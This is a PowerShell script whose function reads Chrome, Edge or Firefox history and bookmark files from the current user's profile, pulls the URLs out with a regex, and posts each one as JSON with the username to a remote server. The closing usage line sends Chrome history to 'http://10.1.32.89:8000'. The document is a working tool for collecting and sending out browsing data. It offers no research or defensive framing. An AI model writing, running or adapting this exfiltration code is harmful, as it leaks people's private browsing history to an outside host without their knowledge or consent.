function Get-BrowserData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('chrome','edge','firefox')]
        [string]$Browser,
        [Parameter(Mandatory)]
        [ValidateSet('history','bookmarks')]
        [string]$DataType,
        [string]$Search = '.',
        [string]$RemoteServer  # Added parameter for remote server
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    switch ("$Browser`_$DataType") {
        'chrome_history' {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
        }
        'chrome_bookmarks' {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
        }
        'edge_history' {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
        }
        'edge_bookmarks' {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
        }
        'firefox_history' {
            $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
        }
        'firefox_bookmarks' {
            Write-Warning "Firefox bookmarks are not supported."
            return
        }
        default {
            Write-Warning "Invalid combination: $Browser $DataType"
            return
        }
    }

    if (-not (Test-Path $Path)) {
        Write-Warning "File not found: $Path"
        return
    }

    # Get data and handle both output and remote sending
    $data = Get-Content -Path $Path -ErrorAction SilentlyContinue |
            Select-String -AllMatches $Regex |
            ForEach-Object { $_.Matches.Value } |
            Sort-Object -Unique |
            Where-Object { $_ -match $Search }

    foreach ($item in $data) {
        $Payload = @{
            User     = $env:UserName
            Browser  = $Browser
            DataType = $DataType
            URL      = $item
        } | ConvertTo-Json

        # Send to remote server if specified
        if ($RemoteServer) {
            try {
                Invoke-RestMethod -Uri $RemoteServer -Method Post -Body $Payload -ContentType 'application/json'
            }
            catch {
                Write-Warning "Failed to send data to remote server: $_"
            }
        }
        else {
            # Output to pipeline if no remote server specified
            [PSCustomObject]$Payload
        }
    }
}

# Usage: Call the function with required parameters
Get-BrowserData -Browser 'chrome' -DataType 'history' -RemoteServer 'http://10.1.32.89:8000'
